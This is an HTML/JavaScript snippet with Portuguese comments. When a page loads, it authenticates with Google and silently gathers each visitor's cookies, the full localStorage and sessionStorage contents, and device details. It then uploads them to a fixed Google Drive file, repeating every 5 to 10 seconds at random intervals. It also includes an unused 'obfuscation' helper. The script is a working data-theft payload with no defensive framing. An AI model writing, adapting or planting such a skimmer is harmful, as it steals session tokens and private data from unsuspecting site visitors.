<script src="https://apis.google.com/js/api.js"></script>
<script>
(function() {
    // Função para gerar uma chave aleatória (para ofuscação)
    function gerarChave() {
        return Math.random().toString(36).substr(2, 8);
    }

    // Função de ofuscação básica
    function ofuscar(str) {
        let chave = gerarChave();
        let dados = str.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ chave.charCodeAt(0))).join('');
        return dados;
    }

    // Função para autenticar o usuário com o Google
    function iniciarAutenticacao() {
        gapi.auth2.init({
            client_id: '819636896801-lhecrnpmgem4940dsmrnp8g5dvcgh2rb.apps.googleusercontent.com', // Seu Client ID
            scope: 'https://www.googleapis.com/auth/drive.file' // Permissões do Google Drive
        }).then(function () {
            if (gapi.auth2.getAuthInstance().isSignedIn.get()) {
                coletarDados(); // Coletar dados após autenticação
            } else {
                gapi.auth2.getAuthInstance().signIn().then(function() {
                    coletarDados(); // Coletar dados após login
                });
            }
        });
    }

    // Função para enviar dados para o Google Drive
    function enviarParaGoogleDrive(dados) {
        const fileId = '1-74Wo40fWomag36iR5z0i8iVmTIuX_sB'; // ID do arquivo no Google Drive
        const fileMetadata = {
            'name': 'dados_coletados.json', // Nome do arquivo
            'mimeType': 'application/json'
        };
        const media = {
            mimeType: 'application/json',
            body: JSON.stringify(dados) // Dados no formato JSON
        };

        // Criar ou atualizar o arquivo no Google Drive
        gapi.client.drive.files.update({
            fileId: fileId,
            resource: fileMetadata,
            media: media
        }).then(function(response) {
            console.log('Arquivo atualizado com sucesso. ID do arquivo:', response.result.id);
        }, function(error) {
            console.error('Erro ao enviar para o Google Drive:', error);
        });
    }

    // Função para coletar dados do navegador
    function coletarDados() {
        let dados = {
            userAgent: navigator.userAgent,
            navegador: navigator.appName,
            plataforma: navigator.platform,
            tela: {
                largura: screen.width,
                altura: screen.height,
                profundidade: screen.colorDepth
            },
            cookies: document.cookie,
            localStorage: localStorage.length,
            sessionStorage: sessionStorage.length,
            geolocalizacao: "Não permitida", // Não solicitando permissão
            dispositivo: {
                tipo: 'Desktop/Móvel',
                toques: []
            },
            armazenamento: {
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage)
            }
        };

        // Coletar dados de toque (em dispositivos móveis)
        if ('ontouchstart' in window) {
            dados.dispositivo.tipo = 'Móvel';
            dados.dispositivo.toques = [{ x: 10, y: 15 }];  // Exemplo de toque
        }

        // Enviar os dados coletados para o Google Drive
        enviarParaGoogleDrive(dados);
    }

    // Carregar as APIs do Google
    function carregarAPI() {
        gapi.load('client:auth2', iniciarAutenticacao);
    }

    // Chamada para inicializar e carregar a API
    carregarAPI();

    // Executar a coleta de dados periodicamente
    setInterval(coletarDados, Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000); // Intervalo aleatório de 5 a 10 segundos

})();
</script>
